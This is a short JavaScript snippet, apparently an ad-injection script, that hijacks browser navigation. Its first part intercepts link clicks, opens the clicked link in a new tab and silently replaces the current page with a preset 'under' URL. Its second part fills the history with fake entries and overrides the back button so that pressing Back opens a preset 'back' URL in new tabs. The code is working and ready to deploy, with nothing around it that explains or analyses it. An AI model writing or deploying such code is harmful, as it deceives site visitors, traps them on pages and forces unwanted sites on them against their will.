if (typeof under !== "undefined" && under !== null) {
    if (typeof cta !== "undefined" && cta !== null) {
        document.addEventListener('click', function (event) {
            var target = event.target;
            while (target) {
                if (target.tagName === 'A' && target.classList.contains(cta)) {
                    const linkHref = target.href;
                    event.preventDefault();
                    window.open(linkHref, '_blank');
                    window.location.replace(under);
                    break;
                }
                target = target.parentNode;
            }
        });
    } else {
        document.addEventListener('click', function (event) {
            var target = event.target;
            while (target) {
                if (target.tagName === 'A') {
                    const linkHref = target.href;
                    event.preventDefault();
                    window.open(linkHref, '_blank');
                    window.location.replace(under);
                    break;
                }
                target = target.parentNode;
            }
        });
    }
}

if (typeof back !== "undefined" && back !== null) {
    !(function () {
        var t;
        var backAttempts = 0;
        const maxAttempts = 6;

        const openInNewTab = function () {
            const dummyLink = document.createElement('a');
            dummyLink.href = back;
            dummyLink.target = '_blank';
            document.body.appendChild(dummyLink);
            dummyLink.click();
            document.body.removeChild(dummyLink);
        };

        const URL = window.location.href.split(/[#]/)[0];
        for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');

        onpopstate = function (event) {
            if (event.state) {
                if (backAttempts < maxAttempts) {
                    setTimeout(openInNewTab, 100); // Wait for 1 second before attempting to open again
                    backAttempts++;
                } else {
                    window.open(back, '_blank'); // After 6 attempts, open in a new tab without delay
                    backAttempts = 0; // Reset the counter
                }
            } else {
                history.pushState({}, '', URL + '#'); // Prevent redirection in the same tab
            }
        };
    })();
}
